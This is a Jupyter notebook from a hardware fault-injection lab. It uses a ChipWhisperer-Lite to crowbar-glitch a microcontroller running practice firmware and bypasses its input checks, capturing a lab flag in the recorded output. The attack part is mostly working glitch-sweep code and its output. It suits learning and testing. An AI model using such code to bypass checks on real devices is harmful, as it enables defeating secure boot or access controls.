# glitch_lab — ChipWhisperer-Lite sweeps against the practice firmware

Run with the **cwenv** kernel (`C:\Users\Samruddhi\ChipWhisperer\cwenv\Scripts\python.exe`). This notebook lives in
`glitch_lab/host/` and imports `lab_client.py` from the same folder.

**Before the first cell:** firmware flashed (`..\flash.ps1`), and `lab_client.py COMx selftest` already PASSED with
the CW disconnected. Wiring (see `../README.md`):

| board | → | CW-Lite |
|---|---|---|
| PB0 (J1 right col, row 5) | trigger | `tio4` |
| old C3 pad, VCORE side (after cap mod) | crowbar | glitch SMA / LP |
| NRST (J2) | reset | `nRST` |
| GND | | GND (shared with XDS110) |

XDS110 keeps only **3V3, GND, RXD, TXD** connected once CW owns NRST.

**Crowbar FET:** set by `FET` in the setup cell (currently `hp`). Exactly one FET is on per shot, never both.

In [8]:
import os, sys, time, json, csv, hashlib, datetime
sys.path.insert(0, os.path.abspath('.'))
import chipwhisperer as cw
from lab_client import Lab, WRONG, RIGHT, parse_reply, classify

scope = cw.scope()
scope.default_setup()
scope.clock.clkgen_freq  = 60e6
CW_CLK    = scope.clock.clkgen_freq        # glitch timebase: 1 count ~ 16.7 ns
TARGET_HZ = 32e6                           # MSPM0 SYSOSC (self-clocked, NOT synced to the CW)

scope.glitch.clk_src     = 'clkgen'
scope.glitch.output      = 'enable_only'   # sustained crowbar for `repeat` CW cycles
scope.glitch.trigger_src = 'ext_single'
scope.glitch.repeat      = 1
scope.glitch.ext_offset  = 0
scope.trigger.triggers   = 'tio4'
scope.io.tio4            = 'high_z'
scope.adc.timeout        = 0.5

# We use the scope as a pure glitcher (no power-trace capture). Tell it to expect almost no
# ADC samples so capture() returns fast and does not spam "Received fewer points" or produce
# bogus timeouts. The ext-trigger detection used for  still works.
import logging
scope.adc.samples = 1
cw.set_all_log_levels(logging.ERROR)   # silence 'Trigger not found in ADC data' etc (per-logger handlers)

def fets_off():
    scope.io.glitch_hp = False; scope.io.glitch_lp = False
FET = 'hp'   # crowbar FET for every shot in this notebook: 'hp' or 'lp' (never both)

def lp_on():
    # name kept for the sweep/confirm cells; turns on exactly ONE FET, chosen by FET
    if FET == 'hp':
        scope.io.glitch_lp = False; scope.io.glitch_hp = True
        assert scope.io.glitch_hp and not scope.io.glitch_lp, 'HP only -- never both'
    else:
        scope.io.glitch_hp = False; scope.io.glitch_lp = True
        assert scope.io.glitch_lp and not scope.io.glitch_hp, 'LP only -- never both'

fets_off()
cyc_to_cw = lambda c: c * CW_CLK / TARGET_HZ
print('1 target cycle = %.2f CW counts' % cyc_to_cw(1))

scope.gain.mode                          changed from low                       to high                     
scope.gain.gain                          changed from 0                         to 30                       
scope.gain.db                            changed from 5.5                       to 24.8359375               
scope.adc.basic_mode                     changed from low                       to rising_edge              
scope.adc.samples                        changed from 24445                     to 5000                     
scope.adc.trig_count                     changed from 2410387                   to 25862705                 
scope.clock.adc_src                      changed from clkgen_x1                 to clkgen_x4                
scope.clock.adc_freq                     changed from 0                         to 29538471                 
scope.clock.adc_rate                     changed from 0.0                       to 29538471.0               
scope.clock.clkgen_

In [9]:
TARGET_PORT = 'COM14'      # XDS110 backchannel -- re-check: [System.IO.Ports.SerialPort]::GetPortNames()

def cw_reset(hold=0.05):
    scope.io.nrst = 'low'; time.sleep(hold); scope.io.nrst = 'high_z'

lab = Lab(TARGET_PORT, reset_fn=cw_reset, boot_timeout=2.0)   # raise boot_timeout if BOOT is slow
print('rebooted clean:', lab.wait_boot())
print(lab.cmd('v'))

rebooted clean: True
glitchlab v1 levels=0-9 trig=PB0


## Gate (CLAUDE.md): baseline → positive control → measure the window
Pick a level. Start at **0** (find the energy that faults the chip at all), then **1, 3, 4, 2, 8, 7, 5, 6**.

In [5]:
LEVEL = 9
SEND  = WRONG[LEVEL]          # override for variants, e.g. '4 c0ffe0' (late mismatch) or '7 0' (random delay)

fets_off()
# 1) baseline: N no-glitch shots, must be identical
ok, info = lab.learn_baseline(LEVEL, 30, SEND)
print('baseline', 'STABLE' if ok else 'UNSTABLE', info)
assert ok, 'Baseline unstable -- STOP, do not sweep.'

# 2) positive control (lite): the correct input must classify as GRANT
if LEVEL in RIGHT:
    cls, rep, raw = lab.shot(LEVEL, RIGHT[LEVEL])
    print('positive control:', cls, raw); assert cls == 'GRANT'

# 3) window: firmware-measured cycles vs trigger width seen by the CW (FETs still off)
scope.arm(); lab.ser.reset_input_buffer(); lab.ser.write((SEND + '\n').encode())
timed_out = scope.capture(); raw = lab.readline(0.3)
win_s  = scope.adc.trig_count / scope.clock.adc_freq
c_fw   = (parse_reply(raw) or {}).get('c')
print('trigger seen:', not timed_out, '| reply:', raw)
print('window: CW %.2f us (%d CW counts) | firmware c=%s cycles = %.2f us'
      % (win_s * 1e6, win_s * CW_CLK, c_fw, (c_fw or 0) / TARGET_HZ * 1e6))
OFFSET_MAX = int(win_s * CW_CLK) + 20      # sweep a little past the window: pipeline/latency

def near_end(before_cycles=12, after_cycles=4, step=1):
    # In L1/L3/L4/L8 the deciding branch sits a few cycles before the window closes.
    # Returns ext_offsets covering [end - before, end + after] target cycles (window end = OFFSET_MAX-20).
    end = OFFSET_MAX - 20
    return range(max(0, int(end - cyc_to_cw(before_cycles))), int(end + cyc_to_cw(after_cycles)) + 1, step)

(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1


baseline STABLE {'c': [2337], 'bad': []}
positive control: GRANT L9 GRANT c=2339 flag=lab{l9_widened_skip}
trigger seen: False | reply: L9 DENY c=2337
window: CW 72.25 us (4334 CW counts) | firmware c=2337 cycles = 73.03 us


## Crowbar sanity / reset-threshold finder (STOCK board, no cap mod)
Run this **after the gate cell**. Go/no-go test for the unmodified VCORE cap: ramp `repeat` at one
mid-window offset until the board stops replying.
- **First NOREPLY at some repeat N** -> the crowbar reaches the core. Faults live a few counts **below** N;
  sweep `REPEATS` there.
- **No NOREPLY up to the ceiling** -> the 0.47 uF tank wins. VCORE crowbar is not viable on this board
  without the mod; pivot to the L2 timing attack (`timing2`) and the logic levels.

The latch guard runs after every disturbed shot. If it reports LATCH, USB power-cycle the board.
Expect resets and the occasional latch here.

**FET switch:** `FET = 'hp'` uses the high-power crowbar. That overrides the LP-only rule in CLAUDE.md
(HP risks the board). It's capped at repeat 40 and stops at the first reset. Exactly one FET is on per shot.
Set `FET = 'lp'` to go back.

In [ ]:
# needs cells 1, 2 and the gate cell already run (scope, lab, fets_off, LEVEL, SEND, OFFSET_MAX)
# FET comes from the setup cell (global switch)

SANITY_OFFSET = max(0, (OFFSET_MAX - 20) // 2)   # middle of the measured window
CEILING       = 80                               # stops at the first reset anyway
PER_REP       = 10

def fet_on():
    # exactly ONE crowbar FET on, never both
    if FET == 'hp':
        scope.io.glitch_lp = False; scope.io.glitch_hp = True
        assert scope.io.glitch_hp and not scope.io.glitch_lp, 'HP only, LP must be OFF'
    else:
        scope.io.glitch_hp = False; scope.io.glitch_lp = True
        assert scope.io.glitch_lp and not scope.io.glitch_hp, 'LP only, HP must be OFF'

def _sanity_shot():
    fet_on(); scope.arm()
    lab.ser.reset_input_buffer(); lab.ser.write((SEND + '\n').encode())
    scope.capture(); raw = lab.readline(0.3)
    return classify(LEVEL, parse_reply(raw), lab.base_c.get(LEVEL))

scope.glitch.output = 'enable_only'
scope.glitch.ext_offset = SANITY_OFFSET
print('FET=%s | ramping repeat at offset %d (window end ~%d), ceiling %d ...'
      % (FET.upper(), SANITY_OFFSET, OFFSET_MAX - 20, CEILING))
first_effect = first_noreply = None
try:
    for rep in range(1, CEILING + 1):
        scope.glitch.repeat = rep
        tally = {}
        for _ in range(PER_REP):
            cls = _sanity_shot()
            if cls != 'CLEAN':
                fets_off()
                if not lab.wait_boot() and not lab.wait_boot():
                    print('  LATCH at repeat %d -- USB power-cycle the board, then rerun' % rep)
                    cls = 'LATCH'
            tally[cls] = tally.get(cls, 0) + 1
            if cls == 'LATCH':
                break
        if tally.get('EFFECT') and first_effect is None:
            first_effect = rep
        if (tally.get('NOREPLY') or tally.get('LATCH')) and first_noreply is None:
            first_noreply = rep
        if set(tally) != {'CLEAN'}:
            print('  repeat %3d -> %s' % (rep, tally))
        if first_noreply is not None:
            break
finally:
    fets_off()

print('\nfirst EFFECT at repeat:', first_effect, '| first NOREPLY/LATCH at repeat:', first_noreply)
if first_noreply:
    print('VERDICT: crowbar reaches the core. Sweep REPEATS = range(%d, %d) to find the fault band.'
          % (max(1, first_noreply - 8), first_noreply + 1))
elif first_effect:
    print('VERDICT: effects but no reset -- sweep REPEATS around', first_effect)
else:
    print('VERDICT: nothing up to repeat %d. The stock VCORE cap likely blocks this injection point.' % CEILING)

## Sweep: `ext_offset` over the WHOLE window (coarse first) × `repeat` from LOW
Fill hot spans in at step 1 later. Re-run with `MODE='glitch_only'` if `enable_only` finds nothing (different
threshold). Re-measure onset every ~30 min (thermal drift).

In [ ]:
MODE        = 'enable_only'              # or 'glitch_only' (then also set WIDTH, e.g. 10..45 %)
WIDTH       = 30
OFFSET_STEP = 1 if OFFSET_MAX < 300 else 10
OFFSETS     = range(0, OFFSET_MAX + 1, OFFSET_STEP)   # whole window; or near_end() once you know the target
REPEATS     = range(1, 1000, 100)               # up to ~35 counts (~20 target cycles) = the firmware safety cap; DO NOT exceed
TRIES       = 3                          # shots per (offset, repeat)
RESET_EVERY = 300                        # periodic clean reboot even if all CLEAN

scope.glitch.output = MODE
if MODE == 'glitch_only':
    scope.glitch.width = WIDTH; scope.glitch.offset = 0

ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
run_dir = os.path.join('..', 'runs', '%s_glitchlab_L%d_%s' % (ts, LEVEL, MODE))
os.makedirs(run_dir, exist_ok=True)
fw_bin = os.path.join('..', 'build', 'glitchlab_bootloader.bin')
meta = dict(level=LEVEL, mode=MODE, fet=FET, width=WIDTH if MODE == 'glitch_only' else None, cw_clk=CW_CLK,
            target_hz=TARGET_HZ, offset_max=OFFSET_MAX, offset_step=OFFSET_STEP,
            repeats=[REPEATS.start, REPEATS.stop], tries=TRIES, base_c=lab.base_c.get(LEVEL),
            port=TARGET_PORT, send=SEND,
            fw_sha256=hashlib.sha256(open(fw_bin, 'rb').read()).hexdigest() if os.path.exists(fw_bin) else None)
json.dump(meta, open(os.path.join(run_dir, 'meta.json'), 'w'), indent=2)

def fire():
    lp_on()
    scope.arm()
    lab.ser.reset_input_buffer()
    lab.ser.write((SEND + '\n').encode())
    timed_out = scope.capture()
    raw = lab.readline(0.3)
    rep = parse_reply(raw)
    return classify(LEVEL, rep, lab.base_c.get(LEVEL)), rep, raw, not timed_out

def guard(cls):
    # latch guard after any non-CLEAN shot: must reboot clean, else halt
    fets_off()
    if not lab.wait_boot() and not lab.wait_boot():
        print('LATCH suspected -- HALT. USB power-cycle the board.')
        return 'LATCH'
    return cls

rows, counts, halted, n = [], {}, False, 0
f = open(os.path.join(run_dir, 'trials.csv'), 'w', newline='')
w = csv.writer(f); w.writerow(['t', 'ext_offset', 'repeat', 'try', 'cls', 'result', 'c', 'd', 'n', 'fired', 'raw'])
try:
    for off in OFFSETS:
        if halted: break
        scope.glitch.ext_offset = off
        for rep_ in REPEATS:
            if halted: break
            scope.glitch.repeat = rep_
            for k in range(TRIES):
                cls, rep, raw, fired = fire(); n += 1
                if cls != 'CLEAN' or n % RESET_EVERY == 0:
                    cls = guard(cls)
                    if cls == 'LATCH':
                        print('  at off=%d rep=%d' % (off, rep_)); halted = True
                counts[cls] = counts.get(cls, 0) + 1
                r_ = rep or {}
                row = [round(time.time(), 3), off, rep_, k, cls, r_.get('result'),
                       r_.get('c'), r_.get('d'), r_.get('n'), fired, raw]
                rows.append(row); w.writerow(row)
                if cls == 'GRANT': print('GRANT  off=%d rep=%d  %s' % (off, rep_, raw))
                if halted: break
        print('off=%4d  %s' % (off, counts))
finally:
    fets_off(); f.close()
print('done:', counts, '->', run_dir)

In [ ]:
# Map: rows = ext_offset, cols = repeat.  . CLEAN  e EFFECT  D DETECT  G GRANT  R NOREPLY  W WEIRD  L LATCH
SYM  = {'CLEAN': '.', 'EFFECT': 'e', 'DETECT': 'D', 'GRANT': 'G', 'NOREPLY': 'R', 'WEIRD': 'W', 'LATCH': 'L'}
PRIO = 'GDeWRL.'
grid = {}
for t, off, rp, k, cls, *_ in rows:
    s = SYM[cls]; cur = grid.get((off, rp), '.')
    grid[(off, rp)] = s if PRIO.index(s) < PRIO.index(cur) else cur
reps = list(REPEATS)
print('off\\rep ' + ''.join('%d' % (r % 10) for r in reps))
for off in sorted({o for o, _ in grid}):
    line = ''.join(grid.get((off, r), ' ') for r in reps)
    if line.strip('.'):
        print('%6d  %s   (~%.1f target cycles after trigger)' % (off, line, off * TARGET_HZ / CW_CLK))
print('\nNext: open ../build/glitchlab_bootloader.lst at level%d, count cycles from the GPIO-set `str` '
      '(window_open) and match the hot offsets to the instruction you hit.' % LEVEL)

open(os.path.join(run_dir, 'run.md'), 'w').write(
    '# glitch_lab L%d %s  send=%r\n\n- counts: %s\n- meta: meta.json, per-shot: trials.csv\n- notes: \n'
    % (LEVEL, MODE, SEND, counts))

## Confirm: hammer ONE point and measure the success rate
A single GRANT in a sweep isn't a technique yet. Pick the best (offset, repeat) from the map, fire N shots,
and record the rate. Re-run it every ~30 min: if the rate collapses, the onset drifted (thermal), so re-sweep
`repeat` at that offset. For L7 random mode, the `d` histogram shows which delay values your offset hits.

In [ ]:
CONF_OFFSET, CONF_REPEAT, CONF_N = 0, 1, 100     # <- fill in from the map

scope.glitch.ext_offset, scope.glitch.repeat = CONF_OFFSET, CONF_REPEAT
tally, d_hits = {}, []
for i in range(CONF_N):
    cls, rep, raw, fired = fire()
    if cls != 'CLEAN':
        cls = guard(cls)
        if cls == 'LATCH': break
    tally[cls] = tally.get(cls, 0) + 1
    if cls == 'GRANT' and rep and 'd' in rep: d_hits.append(rep['d'])
fets_off()
print('off=%d rep=%d  N=%d  ->  %s   GRANT rate = %.1f%%'
      % (CONF_OFFSET, CONF_REPEAT, CONF_N, tally, 100.0 * tally.get('GRANT', 0) / max(1, sum(tally.values()))))
if d_hits: print('L7: GRANTs happened at delay d =', sorted(d_hits))
with open(os.path.join(run_dir, 'run.md'), 'a') as fh:
    fh.write('- confirm off=%d rep=%d N=%d: %s\n' % (CONF_OFFSET, CONF_REPEAT, CONF_N, tally))

## Attack a check (L1..L8) — an actual bypass, not calibration
Prereq: run cells 1 & 2, then set `LEVEL` in the gate cell to your target (start with **1**), `SEND` to the
**wrong** input, and run the gate so baseline=STABLE and `OFFSET_MAX` is set.

This self-contained cell hunts for the glitch that flips the decision. It uses the energy band you found
on L0 (repeat ~450–900 on this stock-cap board) and sweeps `ext_offset` across the whole small window at
step 1. On a `GRANT` it prints the captured flag and keeps going to measure how repeatable it is.

In [10]:
# ======== ATTACK A CHECK (L1..L8) ========
import os, csv, datetime, collections, logging
cw.set_all_log_levels(logging.ERROR)   # silence "Trigger not found in ADC data" (harmless: we glitch, not capture)

# Prereqs come from cell 1 (setup), 2 (connect), 4 (gate). A kernel restart clears them.
_need = ('scope', 'lab', 'LEVEL', 'SEND', 'OFFSET_MAX', 'lp_on', 'fets_off', 'classify', 'parse_reply')
_missing = [n for n in _need if n not in dir()]
if _missing:
    raise RuntimeError('Run earlier cells first (order: 1 -> 2 -> 4 with LEVEL=1 -> this cell). '
                       'Missing: ' + ', '.join(_missing))
if LEVEL < 1:
    raise RuntimeError('LEVEL is 0 (calibration). Set LEVEL=1 in the gate cell (4), rerun it, then this cell.')

# Energy: these checks are SHORT (L1 window ~18 CW counts). A pulse much longer than the window just
# resets/latches the chip. Keep repeat near the window size; the OFFSET places the dip on the branch.
ATK_REP   = range(100, 260, 20)             # L9 fault band (EFFECT appeared at repeat ~100-200)
ATK_OFF   = range(1700, 2700, 8)            # L9 branch ~mid-window (~2160 of 4334); wide pulses span it
ATK_TRIES = 4
GOAL      = 'GRANT'                         # L5/L6: a reproducible 'DETECT' is also a real result

def _safe(s):                               # glitched UART can return undecodable bytes -> keep console happy
    return (s or '').encode('ascii', 'replace').decode()

def _afire():
    lp_on(); scope.arm()
    lab.ser.reset_input_buffer(); lab.ser.write((SEND + '\n').encode())
    scope.capture(); raw = lab.readline(0.3)
    return classify(LEVEL, parse_reply(raw), lab.base_c.get(LEVEL)), raw

def _aguard():                              # must reboot clean after a disturbed shot, else it latched
    fets_off()
    for _ in range(3):
        if lab.wait_boot():
            return 'OK'
    return 'LATCH'

ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
adir = os.path.join('..', 'runs', ts + ('_attack_L%d' % LEVEL)); os.makedirs(adir, exist_ok=True)
af = open(os.path.join(adir, 'trials.csv'), 'w', newline=''); aw = csv.writer(af)
aw.writerow(['off', 'repeat', 'try', 'cls', 'raw'])

hits, tally, latched = [], collections.Counter(), False
print('attacking L%d (send %r), want %s. ctrl-C to stop.' % (LEVEL, SEND, GOAL))
try:
    for off in ATK_OFF:
        if latched:
            break
        scope.glitch.ext_offset = off
        for rp in ATK_REP:
            scope.glitch.repeat = rp
            for k in range(ATK_TRIES):
                cls, raw = _afire()
                if cls != 'CLEAN':
                    if _aguard() == 'LATCH':
                        print('LATCH at off=%d rep=%d. USB power-cycle the board, then rerun.' % (off, rp))
                        latched = True
                tally[cls] += 1
                aw.writerow([off, rp, k, cls, _safe(raw)])
                if cls == GOAL:
                    hits.append((off, rp, _safe(raw)))
                    print('  *** %s  off=%d rep=%d  %s' % (GOAL, off, rp, _safe(raw)))
                if latched:
                    break
            if latched:
                break
        if off % 5 == 0:
            print('off=%3d  %s  hits=%d' % (off, dict(tally), len(hits)))
except KeyboardInterrupt:
    print('stopped.')
finally:
    fets_off(); af.close()

print('\ndone:', dict(tally), '| hits:', len(hits), '->', adir)
if hits:
    flags = {h[2].split('flag=')[1] for h in hits if 'flag=' in h[2]}
    print('FLAG(S) CAPTURED:', flags or '(goal met, no flag field for this level)')
    best = collections.Counter((o, r) for o, r, _ in hits).most_common(5)
    print('most reliable (offset, repeat):', best)
    print('-> put the top one into the Confirm cell to measure the bypass rate.')
else:
    print('no bypass yet. If mostly CLEAN: raise ATK_REP (try range(2, 80, 2)).')
    print('                If mostly NOREPLY/LATCH: lower ATK_REP (try range(1, 20)); pulses are resetting it.')

(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1


attacking L9 (send '9 0'), want GRANT. ctrl-C to stop.


(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1


off=1700  {'CLEAN': 20, 'NOREPLY': 12}  hits=0


(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1


  *** GRANT  off=1708 rep=240  L9 GRANT c=2218 flag=lab{l9_widened_skip}


(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expected: 0 vs 1
(ChipWhisperer Scope ERROR|File OpenADC.py:878) Received fewer points than expec

stopped.

done: {'CLEAN': 138, 'NOREPLY': 51, 'GRANT': 1} | hits: 1 -> ..\runs\20261105_161503_attack_L9
FLAG(S) CAPTURED: {'lab{l9_widened_skip}'}
most reliable (offset, repeat): [((1708, 240), 1)]
-> put the top one into the Confirm cell to measure the bypass rate.
